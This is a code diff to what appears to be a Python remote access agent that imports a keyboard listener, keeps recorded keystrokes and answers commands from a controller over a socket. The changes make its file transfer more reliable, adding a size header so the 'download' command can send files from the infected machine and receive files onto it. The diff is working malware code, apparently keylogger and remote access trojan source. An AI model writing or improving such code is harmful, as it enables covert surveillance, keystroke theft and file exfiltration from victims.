@@ -1,6 +1,6 @@
+import os
 import socket
 import subprocess
-import threading
 
 from pynput import keyboard
 
@@ -24,25 +24,28 @@ class Agent:
 
     def send_file(self, s, filename):
         try:
+            filesize = os.path.getsize(filename)
+            s.send(str(filesize).zfill(10).encode())  # Send 10-byte file size header
             with open(filename, "rb") as f:
-                s.sendall(b"[STARTFILE]")
-                chunk = f.read(1024)
-                while chunk:
+                while chunk := f.read(1024):
                     s.sendall(chunk)
-                    chunk = f.read(1024)
-                s.sendall(b"[ENDFILE]")
         except Exception as e:
-            s.sendall(f"[-] Error reading file: {str(e)}".encode())
+            err_msg = f"[-] Error reading file: {str(e)}"
+            s.send(str(len(err_msg)).zfill(10).encode())
+            s.send(err_msg.encode())
 
     def receive_file(self, s, filename):
         try:
+            size_data = s.recv(10)
+            filesize = int(size_data.decode())
+            received = 0
             with open(filename, "wb") as f:
-                while True:
-                    data = s.recv(1024)
-                    if b"[ENDFILE]" in data:
-                        f.write(data.replace(b"[ENDFILE]", b""))
+                while received < filesize:
+                    data = s.recv(min(1024, filesize - received))
+                    if not data:
                         break
                     f.write(data)
+                    received += len(data)
         except Exception as e:
             print(f"[-] Error saving file: {e}")
 
@@ -66,7 +69,7 @@ class Agent:
                     self.recorded_keys = ""
                     continue
 
-                if command.startswith("download"):
+                if command.startswith("download "):
                     filename = command.split(" ", 1)[1]
                     self.send_file(s, filename)
                     continue
